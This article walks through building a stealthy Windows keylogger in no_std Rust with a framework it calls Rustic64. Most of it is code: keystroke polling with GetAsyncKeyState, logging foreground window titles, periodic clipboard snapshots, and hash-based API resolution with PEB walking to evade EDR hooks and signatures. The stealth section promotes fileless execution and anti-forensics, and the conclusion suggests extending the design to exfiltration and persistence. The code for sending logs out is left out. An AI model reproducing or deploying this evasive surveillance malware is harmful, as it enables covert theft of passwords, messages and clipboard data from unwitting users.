## Rustic64 Keylogger – A Framework for Stealthy Input Capture

This article presents a methodology for building a **stealthy, user-mode keylogger** on Windows using the **Rustic64 framework** (a `no_std` Rust approach).

## **What is Rustic64?**

**Rustic64** is a coding paradigm/framework for writing Windows payloads in Rust with:

- **No standard library** (`#![no_std]`, `#![no_main]`) – resulting in a tiny binary without CRT overhead.
- **No static imports** – all Windows APIs are resolved at runtime using **hashed names** (never `LoadLibrary`+`GetProcAddress`), preventing IAT hooks.
- **PEB walking** – to retrieve module bases and function addresses without calling hooked `ntdll` exports.
- **Self-containment** – the payload stores its state (sockets, handles, flags) inside the **Process Environment Block (PEB)** disguised as a heap entry.

Using Rustic64, we create a keylogger that runs **entirely from memory**, leaves **no strings** in the binary, and bypasses most user-mode EDR hooks.

## **Why use the Rustic64 approach for a keylogger?**

Traditional keyloggers rely on:

- `GetAsyncKeyState`, `GetForegroundWindow`, `GetWindowTextW` (hooked by EDRs).
- Standard Winsock functions (monitored for C2 beacons).
- Clear-text strings (`ws2_32.dll`, `kernel32.dll`) in the binary (easily signatured).

With Rustic64, we **never** call these functions by their imported name. We resolve them via **FNV-1a hashes** over the DLL's export table, meaning the binary contains only `u32` hashes (e.g., `0x2AEED378` for `GetForegroundWindow`), which are impossible to signature statically.



## **Core Components of a Rustic64 Keylogger**

### **1. PEB Traversal & LDR (Loader)**

Before calling any Win32 API, we need the base address of `ntdll.dll`, `kernel32.dll`, and `user32.dll`. Instead of `GetModuleHandle`, we read the **PEB** via `gs:[0x60]` and walk the `LDR_DATA_TABLE_ENTRY` doubly-linked list.

```rust
// Pseudo-code for PEB walking
let peb = (gs:[0x60]) as *const PEB;
let ldr = (*peb).Ldr;
let head = (*ldr).InMemoryOrderModuleList;
// Iterate list until we find a DLL name matching our target hash.
```

This yields a raw `HMODULE` without ever touching `kernel32` imports.

### **2. Hash-based Function Resolution**

We define a set of **pre-computed 32-bit hashes** for every function we need:

```rust
const KERNEL32_BASE_HASH: u32 = 0xD4A2F...; // Hash of "kernel32.dll"
const GET_ASYNC_KEY_STATE_HASH: u32 = 0x7B4DFC8D;
const SOCKET_HASH: u32 = 0xCF36C66E;
// etc.
```

When we need a function pointer, we parse the PE headers of the loaded module, traverse the export table, and compute the hash of each exported name until we match our target hash. Finally, we return the RVA + module base.

This is similar to **Hell's Gate** for syscalls, but extended to all user-mode APIs (`user32`, `ws2_32`).

### **3. Disguised Instance Storage (The "Fake Heap")**

Rustic64 uses a clever persistence trick: the main state (`Instance` struct containing sockets, buffers, and base addresses) is appended to the PEB's heap list. 

```rust
// The PEB has ProcessHeaps array and NumberOfHeaps.
(*peb).number_of_heaps += 1;
*process_heaps.add(number_of_heaps) = instance_ptr; // Store our struct pointer!
```

We mark it with a unique `MAGIC` value so we can retrieve it later inside any callback or loop without global variables. This keeps our stack clean and avoids `.data` sections that could be scanned.



### **4. Keyboard & Clipboard Capture Logic – Code Walkthrough**

The heart of the keylogger is a tight polling loop that runs every 1–2 milliseconds. It does three things: monitor key states, detect foreground window changes, and periodically read the clipboard. Below we show the essential code snippets, all using APIs resolved by their hashes.

#### **4.1 Polling Loop Setup**

We resolve the required functions from `user32.dll` and `kernel32.dll` via their hashes:

```rust
// Resolve functions once, outside the loop
let get_async_key_state: extern "system" fn(i32) -> i16 = 
    unsafe { core::mem::transmute(ldr_function(user32_base, 0x7B4DFC8D)) };
let get_foreground_window: extern "system" fn() -> usize = 
    unsafe { core::mem::transmute(ldr_function(user32_base, 0x2AEED378)) };
let get_window_text_w: extern "system" fn(usize, *mut u16, i32) -> i32 = 
    unsafe { core::mem::transmute(ldr_function(user32_base, 0x3ADB0ED9)) };
let sleep: extern "system" fn(u32) = 
    unsafe { core::mem::transmute(ldr_function(kernel32_base, 0x0E07CD7E)) };
```

#### **4.2 Key State Tracking**

We maintain a `[bool; 256]` array to remember which virtual keys are currently pressed. For each key (8..190), we call `GetAsyncKeyState` and check the most significant bit (0x8000). If the key just became pressed, we map it to a character (or a special token like `[BKSP]`) and append to a `String` buffer.

```rust
let mut key_states = [false; 256];
let mut buffer = String::new();

loop {
    for k in 8..190 {
        let is_pressed = (get_async_key_state(k) as u16 & 0x8000) != 0;
        if is_pressed && !key_states[k as usize] {
            // Translate virtual key to a string representation
            let key_char = match k {
                0x0D => "\n",
                0x20 => " ",
                0x08 => "[BKSP]",
                0x09 => "[TAB]",
                0x30..=0x39 => {
                    // Digits with Shift handling (and AZERTY quirks)
                    // ... (layout logic)
                },
                0x41..=0x5A => {
                    // Letters: shift determines case
                    if shift { /* uppercase */ } else { /* lowercase */ }
                },
                _ => "",
            };
            buffer.push_str(key_char);
            key_states[k as usize] = true;
        } else if !is_pressed {
            key_states[k as usize] = false;
        }
    }
    // Send buffer when non-empty (after optional clipboard/context)
    // ...
    sleep(1);
}
```

#### **4.3 Context: Foreground Window Title**

When the foreground window changes (compared to `last_hwnd`), we fetch its title using `GetWindowTextW` and prepend it to the log. This gives context to the keystrokes (e.g., "User is typing in Notepad").

```rust
let hwnd = get_foreground_window();
if hwnd != 0 && hwnd != last_hwnd {
    last_hwnd = hwnd;
    let mut title_buf = [0u16; 256];
    let len = get_window_text_w(hwnd, title_buf.as_mut_ptr(), 256);
    if len > 0 {
        let title = String::from_utf16_lossy(&title_buf[..len as usize]);
        buffer.push_str("\n[CTX: ");
        buffer.push_str(&title);
        buffer.push_str("]\n");
    }
}
```

#### **4.4 Clipboard Snapshot (Every ~1 second)**

We also read the clipboard periodically. We resolve `OpenClipboard`, `GetClipboardData`, `GlobalLock`, `GlobalUnlock`, and `CloseClipboard` via hashes. The following snippet reads ANSI text (`CF_TEXT`):

```rust
let open_clip: extern "system" fn(usize) -> i32 = /* resolved */;
let get_clip_data: extern "system" fn(u32) -> usize = /* resolved */;
let global_lock: extern "system" fn(usize) -> *const u8 = /* resolved */;
let global_unlock: extern "system" fn(usize) -> i32 = /* resolved */;
let close_clip: extern "system" fn() -> i32 = /* resolved */;

let mut clip_timer = 0;
let mut last_clipboard = String::new();

// Inside the main loop:
clip_timer += 1;
if clip_timer >= 1000 {  // every ~1 second (assuming sleep(1) in ms)
    if open_clip(0) != 0 {
        let h_data = get_clip_data(1); // CF_TEXT
        if h_data != 0 {
            let ptr = global_lock(h_data);
            if !ptr.is_null() {
                // Determine length (null-terminated)
                let mut len = 0;
                while *ptr.add(len) != 0 && len < 1024 { len += 1; }
                let slice = core::slice::from_raw_parts(ptr, len);
                let current = String::from_utf8_lossy(slice).into_owned();
                if current != last_clipboard && !current.is_empty() {
                    last_clipboard = current.clone();
                    // Send clipboard content separately (with a CLIPBOARD tag)
                }
                global_unlock(h_data);
            }
        }
        close_clip();
    }
    clip_timer = 0;
}
```

## **Stealth & OPSEC Summary**

- **No strings**: Function names and DLL names exist only as hashes.
- **No IAT**: The Import Address Table is essentially empty; all calls are via function pointers on the stack.
- **Fileless potential**: If integrated into a shellcode loader, the entire keylogger can live in `RWX` memory without touching disk.
- **Low CPU**: Polling every 1ms is standard and not suspicious (many games/accessibility tools do this).
- **Context awareness**: Capturing window titles helps the operator understand what the target is doing, but does not significantly increase the forensic footprint.

## **Limitations of this Approach**

- **Polling overhead**: `GetAsyncKeyState` polling is not as stealthy as an interrupt-driven hook (like `SetWindowsHookEx`), but it avoids injecting DLLs into other processes, which is heavily monitored.
- **Access rights**: Requires the process to run in the user's session with appropriate privileges (no admin required for user-mode hooks, but `video` or `admin` might be needed for some operations).
- **No Unicode clipboard**: This example reads `CF_TEXT` (ANSI), which may miss Unicode characters. A more advanced version could read `CF_UNICODETEXT`.

## **Conclusion**

The Rustic64 framework provides a robust, anti‑forensic blueprint for building Windows keyloggers. By relying on **PEB walking** and **hash-based API resolution**, it achieves a high degree of stealth while maintaining compatibility across modern Windows versions (10/11). This approach is not limited to keylogging—it can be extended to screen capture, file exfiltration, or persistence mechanisms with minimal adjustments to the loader logic.